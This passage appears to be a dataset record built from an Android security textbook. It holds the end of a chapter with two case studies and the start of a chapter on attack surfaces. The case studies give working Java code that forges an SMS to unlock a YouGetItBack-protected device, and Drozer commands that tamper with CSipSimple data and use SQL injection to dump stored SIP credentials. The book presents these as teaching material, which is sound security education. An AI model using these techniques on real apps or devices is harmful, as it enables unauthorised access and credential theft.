SMS_RECEIVED Intent\nrequires the SEND_SMS_BROADCAST permission (which is limited only to system\napplications), you’ll explicitly specify the Broadcast Receiver in the target app.\nThe overall structure of SMS Protocol Data Units (PDUs) is beyond the scope\nof this chapter, and some of those details are covered in Chapter 11, but the\nfollowing code shows pertinent snippets to forge the Intent containing your\nSMS message:\nString body = \"YGIB:U 137223048617183\";\nString sender = \"2125554242\";\nbyte[] pdu = null;\nbyte[] scBytes = PhoneNumberUtils.networkPortionToCalledPartyBCD(\"\n0000000000\");\nbyte[] senderBytes =\nPhoneNumberUtils.networkPortionToCalledPartyBCD(sender);\nint lsmcs = scBytes.length;\nbyte[] dateBytes = new byte[7];\nCalendar calendar = new GregorianCalendar();\ndateBytes[0] = reverseByte((byte) (calendar.get(Calendar.YEAR)));\ndateBytes[1] = reverseByte((byte) (calendar.get(\nCalendar.MONTH) + 1));\ndateBytes[2] = reverseByte((byte) (calendar.get(\nCalendar.DAY_OF_MONTH)));\ndateBytes[3] = reverseByte((byte) (calendar.get(\nCalendar.HOUR_OF_DAY)));\ndateBytes[4] = reverseByte((byte) (calendar.get(\nCalendar.MINUTE)));\ndateBytes[5] = reverseByte((byte) (calendar.get(\nCalendar.SECOND)));\ndateBytes[6] = reverseByte((byte) ((calendar.get(\nCalendar.ZONE_OFFSET) + calendar\n.get(Calendar.DST_OFFSET)) / (60 * 1000 * 15)));\ntry\n{\nByteArrayOutputStream bo = new ByteArrayOutputStream();\nbo.write(lsmcs);\nbo.write(scBytes);\nbo.write(0x04);\nbo.write((byte) sender.length());\nbo.write(senderBytes);\nbo.write(0x00);\nbo.write(0x00); // encoding: 0 for default 7bit\nbo.write(dateBytes);\ntry\n{\nString sReflectedClassName =\nc04.indd 01:15:7:PM 02/24/2014 Page 118\nChapter 4 ■ Reviewing Application Security 119\n\"com.android.internal.telephony.GsmAlphabet\";\nClass cReflectedNFCExtras = Class.forName(sReflectedClassName);\nMethod stringToGsm7BitPacked = cReflectedNFCExtras.getMethod(\n\"stringToGsm7BitPacked\", new Class[] { String.class });\nstringToGsm7BitPacked.setAccessible(true);\nbyte[] bodybytes = (byte[]) stringToGsm7BitPacked.invoke(\nnull,body);\nbo.write(bodybytes);\n...\npdu = bo.toByteArray();\nIntent intent = new Intent();\nintent.setComponent(new ComponentName(\"com.yougetitback.\nandroidapplication.virgin.mobile\",\n\"com.yougetitback.androidapplication.SmsIntentReceiver\"));\nintent.setAction(\"android.provider.Telephony.SMS_RECEIVED\");\nintent.putExtra(\"pdus\", new Object[] { pdu });\nintent.putExtra(\"format\", \"3gpp\");\ncontext.sendOrderedBroadcast(intent,null);\nThe code snippet fi rst builds the SMS PDU, including the YGIB:U command,\ntagcode value, the sender’s number, and other pertinent PDU properties. It\nthen uses refl ection to call stringToGsm7BitPacked and pack the body of the\nPDU into the appropriate representation. The byte array representing the PDU\nbody is then placed into the pdu object. Next, An Intent object is created, with\nits target component set to that of the app’s SMS receiver and its action set to\nSMS_RECEIVED. Next, some extra values are set. Most importantly, the pdu object\nis added to the extras using the \"pdus\" key. Finally, sendOrderdBroadcast is\ncalled, which sends your Intent off, and instructs the app to unlock the device.\nTo demonstrate this, the following code is the logcat output when the device\nis locked (in this case via SMS, where 1234 is the user’s PIN which locks the\ndevice):\nI/MessageListener:(14008): 1234\nD/FOREGROUNDSERVICE(14008): onCreate\nI/FindLocationService(14008): FindLocationService created!!!\nD/FOREGROUNDSERVICE(14008): onStartCommand\nD/SIRENSERVICE(14008): onCreate\nD/SIRENSERVICE(14008): onStartCommand\n...\nI/LockAcknowledgeService(14008): LockAcknowledgeService created!!!\nI/FindLocationService(14008): FindLocationService stopped!!!\nI/ActivityManager(13738): START {act=android.intent.action.VIEW\ncat=[test.foobar.123] flg=0x10000000\ncmp=com.yougetitback.androidapplication.virgin.mobile/\ncom.yougetitback.androidapplication.SplashScreen u=0} from pid 14008\n...\nFigure 4-7 shows the screen indicating a locked device.\nc04.indd 01:15:7:PM 02/24/2014 Page 119\n120 Chapter 4 ■ Reviewing Application Security\nFigure 4-7: App-locked device screen\nWhen your app runs, sending the forged SMS to unlock the device, you see\nthe following logcat output:\nI/MessageListener:(14008): YGIB:U TAG:136267293995242\nV/SWIPEWIPE(14008): recieved unlock message\nD/FOREGROUNDSERVICE(14008): onDestroy\nI/ActivityManager(13738): START {act=android.intent.action.VIEW\ncat=[test.foobar.123] flg=0x10000000\ncmp=com.yougetitback.androidapplication.virgin.mobile/\ncom.yougetitback.androidapplication.SplashScreen (has extras) u=0}\nfrom pid 14008\nD/SIRENSERVICE(14008): onDestroy\nI/UnlockAcknowledgeService(14008): UnlockAcknowledgeService created!!!\nI/UnlockAcknowledgeService(14008): UnlockAcknowledgeService stopped!!!\nAnd you return to an unlocked device.\nCase Study: SIP Client\nThis brief example shows you how to discover an unprotected Content Provider—\nand retrieve potentially sensitive data from it. In this case, the application is\nCSipSimple, a popular Session Initiation Protocol (SIP) client. Rather than going\nthrough the same workfl ow as the previous app, we’ll jump right into another\nquick-and-easy dynamic analysis technique.\nc04.indd 01:15:7:PM 02/24/2014 Page 120\nChapter 4 ■ Reviewing Application Security 121\nEnter Drozer\nDrozer (formerly known as Mercury), by MWR Labs, is an extensible, modular\nsecurity testing framework for Android. It uses an agent application running on\nthe target device, and a Python-based remote console from which the tester can\nissue commands. It features numerous modules for operations like retrieving\napp information, discovering unprotected IPC interfaces, and exploiting the\ndevice. By default, it will run as a standard app user with only the INTERNET\npermission.\nDiscovery\nWith Drozer up and running, you quickly identify Content Provider URIs\nexported by CSipSimple, along with their respective permission requirements.\nRun the app.provider.info module, passing –a com.csipsimple as the argu-\nments to limit the scan to just the target app:\ndz> run app.provider.info -a com.csipsimple\nPackage: com.csipsimple\nAuthority: com.csipsimple.prefs\nRead Permission: android.permission.CONFIGURE_SIP\nWrite Permission: android.permission.CONFIGURE_SIP\nMultiprocess Allowed: False\nGrant Uri Permissions: False\nAuthority: com.csipsimple.db\nRead Permission: android.permission.CONFIGURE_SIP\nWrite Permission: android.permission.CONFIGURE_SIP\nMultiprocess Allowed: False\nGrant Uri Permissions: False\nTo even interact with these providers, the android.permission.CONFIGURE_SIP\npermission must be held. Incidentally, this is not a standard Android permis-\nsion—it is a custom permission declared by CSipSimple. Check CSipSimple’s\nmanifest to fi nd the permission declaration. Run app.package.manifest, passing\nthe app package name as the sole argument. This returns the entire manifest,\nso the following output has been trimmed to show only the pertinent lines:\ndz> run app.package.manifest com.csipsimple\n...\n<permission label=\"@2131427348\" name=\"android.permission.CONFIGURE_SIP\"\nprotectionLevel=\"0x1\" permissionGroup=\"android.permission-group.COST_MONEY\"\ndescription=\"@2131427349\">\n</permission>\n...\nYou see that the CONFIGURE_SIP permission is declared with a protectionLevel of\n0x1, which corresponds to “dangerous” (which would prompt the user to accept\nthe permission at install time, something most users might do anyway). However,\nc04.indd 01:15:7:PM 02/24/2014 Page 121\n122 Chapter 4 ■ Reviewing Application Security\nas neither signature nor signatureOrSystem are specifi ed, other applications may\nrequest this permission. The Drozer agent does not have this by default, but\nthat’s easily rectifi ed by modifying the manifest and rebuilding the agent APK.\nAfter your re-minted Drozer agent has the CONFIGURE_SIP permission, you\ncan begin querying these Content Providers. You start by discovering the content\nURIs exposed by CSipSimple. To accomplish this, run the appropriately named\napp.provider.finduris module:\ndz> run app.provider.finduri com.csipsimple\nScanning com.csipsimple...\ncontent://com.csipsimple.prefs/raz\ncontent://com.csipsimple.db/\ncontent://com.csipsimple.db/calllogs\ncontent://com.csipsimple.db/outgoing_filters\ncontent://com.csipsimple.db/accounts/\ncontent://com.csipsimple.db/accounts_status/\ncontent://com.android.contacts/contacts\n...\nSnarfi ng\nThis gives us numerous options, including interesting ones like messages\nand calllogs. Query these providers, starting with messages, using the\napp.provider.query module, with the content URI as the argument.\ndz> run app.provider.query content://com.csipsimple.db/messages\n| id | sender | receiver | contact | body\n| mime_type | type | date | status | read | full_sender |\n| 1 | SELF | sip:bob@ostel.co | sip:bob@ostel.co | Hello! |\ntext/plain | 5 | 1372293408925 | 405 | 1 | < sip:bob@ostel.co> |\nThis returns the column names and rows of data stored, in this case, in a SQLite\ndatabase backing this provider. The instant messaging logs are accessible to you\nnow. These data correspond to the message activity/screen shown in Figure 4-8.\nYou can also attempt to write to or update the provider, using the\napp.provider.update module. You pass in the content URI; the selection and\nselection-args, which specifi es the query constraints; the columns you want to\nreplace; and the replacement data. Here change the receiver and body columns\nfrom their original values to something more nefarious:\ndz> run app.provider.update content://com.csipsimple.db/messages\n--selection \"id=?\" --selection-args 1 --string receiver \"sip:badguy@ostel.co\"\n--string contact \"sip:badguy@ostel.co\" --string body \"omg crimes\"\n--string full_sender \"<sip:badguy@ostel.co>\"\nDone.\nc04.indd 01:15:7:PM 02/24/2014 Page 122\nChapter 4 ■ Reviewing Application Security 123\nYou changed the receiver from bob@ostel.co to badguy@ostel.co, and the\nmessage from Hello! to omg crimes. Figure 4-9 shows how the screen has been\nupdated.\nFigure 4-8: CSipSimple message log screen Figure 4-9: CSipSimple modified message\nlog screen\nYou also saw the calllogs provider, which you can also query:\ndz> run app.provider.query content://com.csipsimple.db/calllogs\n| _id | name | numberlabel | numbertype | date | duration |\nnew | number | type | account_id | status_code | status_\ntext\n| 5 | null | null | 0 | 1372294364590 | 286 | 0\n| \"Bob\" <sip:bob@ostel.co> | 1 | 1 | 200\n| Normal call clearing |\n| 4 | null | null | 0 | 1372294151478 | 34 | 0\n| <sip:bob@ostel.co> | 2 | 1 | 200\n| Normal call clearing |\n...\nMuch like the messages provider and messages screen, calllogs data shows\nup in the screen shown in Figure 4-10.\nc04.indd 01:15:7:PM 02/24/2014 Page 123\n124 Chapter 4 ■ Reviewing Application Security\nThis data can also be updated in one fell swoop, using a selection constraint\nto update all the records for bob@ostel.co:\ndz> run app.provider.update content://com.csipsimple.db/calllogs\n--selection \"number=?\" --selection-args \"<sip:bob@ostel.co>\"\n--string number \"<sip:badguy@ostel.co>\"\nDone.\nFigure 4-11 shows how the screen with the call log updates accordingly.\nFigure 4-10: CSipSimple call log screen Figure 4-11: CSipSimple modified call log\nscreen\nInjection\nContent Providers with inadequate input validation or whose queries are built\nimproperly, such as through unfi ltered concatenation of user input, can be vul-\nnerable to injection. This can manifest in different ways, such as SQL injection\n(for SQLite backed providers) and directory traversal (for fi le-system-backed\nproviders). Drozer provides modules for discovering these issues, such as the\nscanner.provider.traversal and scanner.provider.injection modules.\nRunning the scanner.provider.injection module highlights SQL injection\nvulnerabilities in CSipSimple:\ndz> run scanner.provider.injection -a com.csipsimple\nScanning com.csipsimple...\nc04.indd 01:15:7:PM 02/24/2014 Page 124\nChapter 4 ■ Reviewing Application Security 125\nNot Vulnerable:\ncontent://com.csipsimple.prefs/raz\ncontent://com.csipsimple.db/\ncontent://com.csipsimple.prefs/\n...\ncontent://com.csipsimple.db/accounts_status/\nInjection in Projection:\ncontent://com.csipsimple.db/calllogs\ncontent://com.csipsimple.db/outgoing_filters\ncontent://com.csipsimple.db/accounts/\ncontent://com.csipsimple.db/accounts\n...\nInjection in Selection:\ncontent://com.csipsimple.db/thread/\ncontent://com.csipsimple.db/calllogs\ncontent://com.csipsimple.db/outgoing_filters\n...\nIn the event that the same SQLite database backs multiple providers, much\nlike traditional SQL injection in web applications, you can retrieve the contents\nof other tables. First, look at what’s actually in the database backing these pro-\nviders, once again querying calllogs using the app.provider.query module. This\ntime, add a projection argument, which specifi es the columns to select, though\nyou’ll pull the SQLite schema with * FROM SQLITE_MASTER--.\ndz> run app.provider.query content://com.csipsimple.db/calllogs\n--projection \"* FROM SQLITE_MASTER--\"\n| type | name | tbl_name | rootpage | sql\n|\n| table | android_metadata | android_metadata | 3 | CREATE TABLE\nandroid_metadata (locale TEXT)\n|\n| table | accounts | accounts | 4 | CREATE TABLE\naccounts (id INTEGER PRIMARY KEY AUTOINCREMENT,active INTEGER,wizard\nTEXT,display_name TEXT,p\nriority INTEGER,acc_id TEXT NOT NULL,reg_uri TEXT,mwi_enabled BOOLEAN,\npublish_enabled INTEGER,reg_timeout INTEGER,ka_interval INTEGER,pidf_tuple_id\nTEXT,force_contac\nt TEXT,allow_contact_rewrite INTEGER,contact_rewrite_method INTEGER,\ncontact_params TEXT,contact_uri_params TEXT,transport\nINTEGER,default_uri_scheme TEXT,use_srtp IN\nTEGER,use_zrtp INTEGER,proxy TEXT,reg_use_proxy INTEGER,realm TEXT,\nscheme TEXT,username TEXT,datatype INTEGER,data TEXT,initial_auth\nINTEGER,auth_algo TEXT,sip_stack\nINTEGER,vm_nbr TEXT,reg_dbr INTEGER,try_clean_reg INTEGER,\nuse_rfc5626 INTEGER DEFAULT 1,rfc5626_instance_id TEXT,rfc5626_reg_id\nTEXT,vid_in_auto_show INTEGER DEFAUL\nT -1,vid_out_auto_transmit INTEGER DEFAULT -1,rtp_port INTEGER DEFAULT –\n1,rtp_enable_qos INTEGER DEFAULT -1,rtp_qos_dscp INTEGER DEFAULT –\nc04.indd 01:15:7:PM 02/24/2014 Page 125"
  },
  {
    "input": "What are the two case studies discussed in this chapter and what do they illustrate about application security on Android?",
    "summary": "This chapter discusses common security issues affecting Android applications, including vulnerabilities like SQL injection and improper permissions. It presents two case studies showing how to analyze and exploit these vulnerabilities using tools such as Androguard and Drozer. The first case study focuses on a device unlock feature using SMS, while the second demonstrates exploiting Content Provider exposures to retrieve sensitive data.",
    "output": "126 Chapter 4 ■ Reviewing Application Security\n1,rtp_bound_addr TEXT,rtp_p\nublic_addr TEXT,android_group TEXT,allow_via_rewrite INTEGER DEFAULT 0,\nsip_stun_use INTEGER DEFAULT -1,media_stun_use INTEGER DEFAULT -1,ice_cfg_use\nINTEGER DEFAULT\n-1,ice_cfg_enable INTEGER DEFAULT 0,turn_cfg_use INTEGER DEFAULT -1,\nturn_cfg_enable INTEGER DEFAULT 0,turn_cfg_server TEXT,turn_cfg_user\nTEXT,turn_cfg_pwd TEXT,ipv6_\nmedia_use INTEGER DEFAULT 0,wizard_data TEXT) |\n| table | sqlite_sequence | sqlite_sequence | 5 | CREATE TABLE\nsqlite_sequence(name,seq)\nYou see that there’s a table called accounts, which presumably contains\naccount data, including credentials. You can use fairly vanilla SQL injection in\nthe projection of the query and retrieve the data in the accounts table, includ-\ning login credentials. You’ll use * FROM accounts-- in your query this time:\ndz> run app.provider.query content://com.csipsimple.db/calllogs\n--projection \"* FROM accounts--\"\n| id | active | wizard | display_name | priority | acc_id\n| reg_uri | mwi_enabled | publish_enabled | reg_timeout | ka_interval |\npidf_tuple_id | force_contact | allow_contact_rewrite\n| contact_rewrite_method | contact_params | contact_uri_params | transport\n| default_uri_scheme | use_srtp | use_zrtp\n| proxy | reg_use_proxy | realm | scheme | username | datatype\n| data | initial_auth | auth_algo | sip_stack |\n...\n| 1 | 1 | OSTN | OSTN | 100 |\n<sip:THISISMYUSERNAME@ostel.co> | sip:ostel.co | 1 | 1\n| 1800 | 0 | null | null | 1\n| 2 | null | null | 3 |\nsip | -1 | 1 | sips:ostel.co:5061 | 3\n|\n* | Digest | THISISMYUSERNAME | 0 | THISISMYPASSWORD | 0\n| null | 0 | *98 | -1 | 1 | 1 |\n...\nNOTE The fl aws in CSipSimple that are discussed in the preceding sections have\nsince been addressed. The CONFIGURE_SIP permission was moved to a more explicit\nnamespace (rather than android.permission) and was given a more detailed\ndescription of its use and impact. Also, the SQL injection vulnerabilities in the Content\nProviders were fi xed, further limiting access to sensitive information.\nSummary\nThis chapter gave an overview of some common security issues affecting Android\napplications. For each issue, the chapter presented a public example to help\nhighlight the potential impact. You also walked through two case studies of\nc04.indd 01:15:7:PM 02/24/2014 Page 126\nChapter 4 ■ Reviewing Application Security 127\npublicly available Android apps. Each case study detailed how to use common\ntools to assess the app, identify vulnerabilities, and exploit them.\nThe fi rst case study used Androguard to perform static analysis, disassem-\nbly, and decompilation of the target application. In doing this, you identifi ed\nsecurity-pertinent components you could attack. In particular, you found a\ndevice lock/unlock feature that used SMS messages for authorization. Next,\nyou used dynamic analysis techniques, such as debugging the app, to augment\nand confi rm the static analysis fi ndings. Finally, you worked through some\nproof-of-concept code to forge an SMS message and exploit the application’s\ndevice unlock feature.\nThe second case study demonstrated a quick and easy way to fi nd Content\nProvider-related exposures in an application using Drozer. First, you discovered\nthat user activity and sensitive message logs were exposed from the app. Next,\nyou saw how easy it is to tamper with the stored data. Finally, the case study\ndiscussed going a step further and exploiting a SQL injection vulnerability to\nretrieve other sensitive data in the provider’s database.\nIn the next chapter, we will discuss the overall attack surface of Android, as\nwell as how to develop overall strategies for attacking Android.\nc04.indd 01:15:7:PM 02/24/2014 Page 127"
  },
  {
    "input": "",
    "summary": "This chapter explains the concept of an Android device's attack surface and how it can be used by attackers or defenders. It defines attack vectors and attack surfaces, discusses how they are classified based on their impact, and explores various categories of attack surfaces, including remote, network, and physical ones. The chapter also covers how Android's attack surfaces are exposed through different technologies like SMS, MMS, Wi-Fi, Bluetooth, and NFC, and how they can be exploited. It highlights the importance of understanding these surfaces to both attack and defend Android devices effectively.",
    "output": "CHAPTER\n5\nUnderstanding Android’s Attack\nSurface\nFully understanding a device’s attack surface is the key to successfully attack-\ning or defending it. This is as true for Android devices as it is for any other\ncomputer system. A security researcher whose goal is to craft an attack using\nan undisclosed vulnerability would begin by conducting an audit. The fi rst\nstep in the audit process is enumerating the attack surface. Similarly, defend-\ning a computer system requires understanding all of the possible ways that a\nsystem can be attacked.\nIn this chapter, you will go from nearly zero knowledge of attack concepts\nto being able to see exactly where many of Android’s attack surfaces lie. First,\nthis chapter clearly defi nes the attack vector and attack surface concepts. Next,\nit discusses the properties and ideologies used to classify each attack surface\naccording to impact. The rest of the chapter divides various attack surfaces into\ncategories and discusses the important details of each. You will learn about the\nmany ways that Android devices can be attacked, in some cases evidenced by\nknown attacks. Also, you will learn about various tools and techniques to help\nyou explore Android’s attack surface further on your own.\n129\nc05.indd 01:17:1:PM 02/24/2014 Page 129\n130 Chapter 5 ■ Understanding Android’s Attack Surface\nAn Attack Terminology Primer\nBefore diving into the depths of Android’s attack surface, we must fi rst defi ne\nand clarify the terminology we use in this chapter. On a computer network, it\nis possible for users to initiate actions that can subvert the security of computer\nsystems other than their own. These types of actions are called attacks; and thus\nthe person perpetrating them is called an attacker. Usually the attacker aims\nto infl uence the confi dentiality, integrity, or accessibility (CIA) of the target\nsystem. Successful attacks often rely on specifi c vulnerabilities present in the\ntarget system. The two most common topics when discussing attacks are attack\nvectors and attack surfaces. Although attack vectors and attack surfaces are inti-\nmately related, and thus often confused with one another, they are individual\ncomponents of any successful attack.\nNOTE The Common Vulnerability Scoring System (CVSS) is a widely accepted stan-\ndard for classifying and ranking vulnerability intelligence. It combines several impor-\ntant concepts to arrive at a numeric score, which is then used to prioritize eff orts to\ninvestigate or remediate vulnerabilities.\nAttack Vectors\nAn attack vector generally refers to the means by which an attacker makes his\nmove. It describes the methods used to carry out an attack. Simply put, it describes\nhow you reach any given vulnerable code. If you look deeper, attack vectors\ncan be classifi ed based on several criteria, including authentication, accessibil-\nity, and diffi culty. These criteria are often used to prioritize how to respond\nto publicly disclosed vulnerabilities or ongoing attacks. For example, sending\nelectronic mail to a target is a very high-level attack vector. It’s an action that\ntypically doesn’t require authentication, but successful exploitation may require\nthe recipient to do something, such as read the message. Connecting to a listen-\ning network service is another attack vector. In this case, authentication may\nor may not be required. It really depends on where in the network service the\nvulnerability lies.\nNOTE MITRE’s Common Attack Pattern Enumeration and Classifi cation (CAPEC)\nproject aims to enumerate and classify attacks into patterns. This project includes and\nextends on the concept of traditional attack vectors.\nAttack vectors are often further classifi ed based on properties of common\nattacks. For example, sending electronic mail with an attachment is a more\nc05.indd 01:17:1:PM 02/24/2014 Page 130\nChapter 5 ■ Understanding Android’s Attack Surface 131\nspecifi c attack vector than just sending electronic mail. To go further, you could\nspecify the exact type of attachment. Another, more specifi c attack vector based\non electronic mail is one where an attacker includes a clickable uniform resource\nlocator (URL) inside the message. If the link is clickable, curiosity is likely to get\nthe better of the recipient and they will click the link. This action might lead to\na successful attack of the target’s computer. Another example is an image pro-\ncessing library. Such a library may have many functions that lead to execution\nof the vulnerable function. These can be considered vectors to the vulnerable\nfunction. Likewise, a subset of the application programming interface (API)\nexposed by the library may trigger execution of the vulnerable function. Any\nof these API functions may also be considered a vector. Finally, any program\nthat leverages the vulnerable library could also be considered a vector. These\nclassifi cations help defenders think about how attacks could be blocked and\nhelp attackers isolate where to fi nd interesting code to audit.\nAttack Surfaces\nAn attack surface is generally understood as a target’s open fl anks—that is to say,\nthe characteristics of a target that makes it vulnerable to attack. It is a physical\nworld metaphor that’s widely adopted by information security professionals.\nIn the physical world, an attack surface is the area of an object that is exposed\nto attack and thus should be defended. Castle walls have moats. Tanks have\nstrategically applied armor. Bulletproof vests protect some of the most vital\norgans. All of these are examples of defended attack surfaces in the physical\nworld. Using the attack surface metaphor allows us to remove parts of informa-\ntion security from an abstract world to apply proven logical precepts.\nMore technically speaking, an attack surface refers to the code that an attacker\ncan execute and therefore attack. In contrast to an attack vector, an attack surface\ndoes not depend on attackers’ actions or require a vulnerability to be present.\nSimply put, it describes where in code vulnerabilities might be waiting to be\ndiscovered. In our previous example, an e-mail-based attack, the vulnerability\nmight lie in the attack surface exposed by the mail server’s protocol parser, the\nmail user agent’s processing code, or even the code that renders the message on\nthe recipient’s screen. In a browser-based attack, all the web-related technolo-\ngies supported by the browser constitute attack surfaces. Hypertext Transfer\nProtocol (HTTP), Hypertext Markup Language (HTML), Cascading Style Sheets\n(CSS), and Scalable Vector Graphics (SVG) are examples of such technologies.\nRemember, though, by defi nition, no vulnerabilities need be present for an attack\nsurface to exist. If a particular piece of code can be exercised by an attacker, it\nis a considered an attack surface and should be studied accordingly.\nSimilar to attack vectors, attack surfaces can be discussed both in general and\nin increasingly specifi c terms. Exactly how specifi c one chooses to be usually\nc05.indd 01:17:1:PM 02/24/2014 Page 131\n132 Chapter 5 ■ Understanding Android’s Attack Surface\ndepends on context. If someone is discussing the attack surface of an Android\ndevice at a high level, they might point out the wireless attack surface. In con-\ntrast, when discussing the attack surface of a particular program they might\npoint out a specifi c function or API. Further still, in the context of local attacks,\nthey might point out a specifi c fi le system entry on a device. Studying one\nparticular attack surface often reveals additional attack surfaces, such as those\nexposed through multiplexed command processing. A good example is a func-\ntion that parses a particular type of packet inside a protocol implementation\nthat encompasses many different types of packets. Sending a packet of one\ntype would reach one attack surface whereas sending a packet of another type\nwould reach a different one.\nAs discussed later in the “Networking Concepts” section, Internet commu-\nnications are broken up into several logical layers. As data traverses from one\nlayer to the next, it passes through many different attack surfaces. Figure 5-1\nshows an example of this concept.\nWeb Server\nPorts\nPHP\nPHP\nWeb Server CGI Application\nInterpreter\nCode\nFigure 5-1: Attack surfaces involved in a PHP web app\nIn Figure 5-1, the outermost attack surface of the system in question consists\nof the two web server ports. If the attack vector is a normal request (not an\nencrypted one), the underlying attack surface of the web server software, as well\nas any server-side web applications, are reachable. Choosing to target a PHP web\napplication, application code and the PHP interpreter both handle untrusted\ndata. As untrusted data is passed along, more attack surfaces are exposed to it.\nOn a fi nal note, a given attack surface might be reachable by a number of attack\nvectors. For example, a vulnerability in an image processing library might be\ntriggered via an e-mail, a web page, an instant messaging application, or other\nvectors. This is especially relevant when vulnerabilities are patched. If the fi x is\nonly applied to one vector, the issue may still be exploited via remaining vectors.\nc05.indd 01:17:1:PM 02/24/2014 Page 132\nChapter 5 ■ Understanding Android’s Attack Surface 133\nClassifying Attack Surfaces\nGenerally the size of a target’s attack surface is directly proportional to how\nmuch it interfaces with other systems, code, devices, users, and even its own\nhardware. Many Android devices aim to interface with anything and everything.\nIn support of this point, Verizon used the phrase “Droid Does” to advertise just\nhow many things you can do with their device. Because the attack surface of an\nAndroid device is so vast, dissection and classifi cation is necessary.\nSurface Properties\nResearchers, including both attackers and defenders, look at the various proper-\nties of attack surfaces to make decisions. Table 5-1 depicts several key properties\nand the reasoning behind their importance.\nTable 5-1: Key Attack Surface Properties\nPROPERTY REASONING\nAttack Vector User interaction and authentication requirements limit the impact\nof any vulnerability discovered in a given attack surface. Attacks that\nrequire the target user to do something extraordinary are less severe\nand may require social engineering to succeed. Likewise, some attack\nsurfaces can be reached only with existing access to the device or\nwithin certain physical proximities.\nPrivileges Gained The code behind a given attack surface might execute with extremely\nhigh privileges (such as in kernel-space), or it might execute inside a\nsandbox with reduced privileges.\nMemory Safety Programs written in non-memory-safe languages like C and C++ are\nsusceptible to more classes of vulnerabilities than those written with\nmemory-safe languages like Java.\nComplexity Complex code, algorithms, and protocols are diffi cult to manage and\nincrease the probability of a programmer making a mistake.\nUnderstanding and analyzing these properties helps guide research priori-\nties and improves overall effectiveness. By focusing on particularly risky attack\nsurfaces (low requirements, high privileges, non-memory-safe, high complexity,\nand so on), a system can be attacked or secured more quickly. As a general rule,\nan attacker seeks to gain as much privilege as possible with as little investment\nas possible. Thus, especially risky attack surfaces are a logical place to focus.\nc05.indd 01:17:1:PM 02/24/2014 Page 133\n134 Chapter 5 ■ Understanding Android’s Attack Surface\nClassifi cation Decisions\nBecause Android devices have such a large and complex set of attack surfaces,\nit is necessary to break them down into groups based on common properties.\nThe rest of this chapter is split into several high-level sections based on the\nlevel of access required to reach a given attack surface. Like an attacker would,\nit starts with the most dangerous, and thus the most attractive, attack surfaces.\nAs necessary, many of the sections are split into subsections that discuss deeper\nattack surfaces. For each attack surface, we provide background information,\nsuch as the intended functionality. In several cases, we provide tools and tech-\nniques for discovering specifi c properties of the underlying code exposed by\nthe attack surface. Finally, we discuss known attacks and attack vectors that\nexercise vulnerabilities in that attack surface.\nRemote Attack Surfaces\nThe largest and most attractive attack surface exposed by an Android device,\nor any computer system, is classifi ed as remote. This name, which is also an\nattack vector classifi cation, comes from the fact that the attacker need not be\nphysically located near her victim. Instead, attacks are executed over a computer\nnetwork, usually the Internet. Attacks against these types of attack surfaces\ncan be particularly devastating because they allow an unknown attacker to\ncompromise the device.\nLooking closer, various properties further divide remote attack surfaces into\ndistinct groups. Some remote attack surfaces are always reachable whereas\nothers are reachable only when the victim initiates network communications.\nIssues where no interaction is required are especially dangerous because they\nare ripe for propagating network worms. Issues that require minor interaction,\nsuch as clicking a link, can also be used to propagate worms, but the worms\nwould propagate less quickly. Other attack surfaces are reachable only when\nthe attacker is in a privileged position, such as on the same network as his\nvictim. Further, some attack surfaces only deal with data that has already been\nprocessed by an intermediary, such as a mobile carrier or Google.\nThe next subsection provides an overview to several important networking\nconcepts and explains a few key differences unique to mobile devices. The fol-\nlowing subsections discuss in more detail the various types of remote attack\nsurfaces exposed by Android devices.\nNetworking Concepts\nA solid understanding of fundamental networking concepts is necessary to\ntruly comprehend the full realm of possible attacks that can traverse computer\nc05.indd 01:17:1:PM 02/24/2014 Page 134\nChapter 5 ■ Understanding Android’s Attack Surface 135\nnetworks. Concepts such as the Open Systems Interconnection (OSI) model and\nthe client-server model describe abstract building blocks used to conceptualize\nnetworking. Typical network confi gurations put constraints on exactly what\ntypes of attacks can be carried out, thereby limiting the exposed attack surface.\nKnowing these constraints, and the avenues to circumvent them, can improve\nboth attackers’ and defenders’ chances of success.\nThe Internet\nThe Internet, founded by the United States Defense Advanced Research Projects\nAgency (DARPA), is an interconnected network of computer systems. Home\ncomputers and mobile devices are the outermost nodes on the network. Between\nthese nodes sit a large number of back-end systems called routers. When a smart-\nphone connects to a website, a series of packets using various protocols traverse\nthe network in order to locate, contact, and exchange data with the requested\nserver. The computers between the endpoints, each referred to as a hop, make\nup what is called a network path. Cellular networks are very similar except that\ncell phones communicate wirelessly to the closest radio tower available. As a\nuser travels, the tower her device talks to changes as well. The tower becomes\nthe cell phone’s fi rst hop in its path to the Internet.\nOSI Model\nThe OSI model describes seven distinct layers involved in network communica-\ntions. Figure 5-2 shows these layers and how they are stacked upon one another.\nLayer 7: Application\nLayer 6: Presentation\nLayer 5: Session\nLayer 4: Transport\nLayer 3: Network\nLayer 2: Data Link\nLayer 1: Physical\nFigure 5-2: OSI seven-layer model\n■ Layer 1—The physical layer describes how two computers communicate\ndata to one another. At this layer, we are talking zeroes and ones. Portions\nof Ethernet and Wi-Fi operate in this layer.\nc05.indd 01:17:1:PM 02/24/2014 Page 135\n136 Chapter 5 ■ Understanding Android’s Attack Surface\n■ Layer 2—The data link layer adds error-correction capabilities to data\ntransmissions traversing the physical layer. The remaining portions of\nEthernet and Wi-Fi, as well as Logical Link Control (LLC) and Address\nResolution Protocol (ARP), operate in this layer.\n■ Layer 3—The network layer is the layer where Internet Protocol (IP),\nInternet Control Message Protocol (ICMP), and Internet Gateway Message\nProtocol (IGMP) operate. The goal of the network layer is to provide rout-\ning mechanisms such that data packets can be sent to the host to which\nthey are destined.\n■ Layer 4—The transport layer aims to add reliability to data transmissions\ntraversing the lower layers. The Transmission Control Protocol (TCP) and\nUser Datagram Protocol (UDP) are said to operate at this layer.\n■ Layer 5—The session layer manages, as its name suggests, sessions between\nhosts on a network. Transport Layer Security (TLS) and Secure Socket\nLayer (SSL) both operate in this layer.\n■ Layer 6—The presentation layer deals with hosts syntactically agreeing\nupon how they will represent their data. Though very few protocols\noperate at this layer, Multipurpose Internet Mail Extensions (MIME) is\none notable standard that does.\n■ Layer 7—The application layer is where data is generated and consumed\ndirectly by the client and server applications of high-level protocols.\nStandard protocols in this layer include Domain Name System (DNS),\nDynamic Host Confi guration Protocol (DHCP), File Transfer Protocol\n(FTP), Simple Network Management Protocol (SNMP), Hypertext Transfer\nProtocol (HTTP), Simple Mail Transfer Protocol (SMTP), and more.\nModern network communications have extended beyond the seven-layer\nOSI model. For example, web services are often implemented with one or more\nadditional layers on top of HTTP. In Android, Protocol Buffers (protobufs) are\nused to transmit structured data and implement Remote Procedure Call 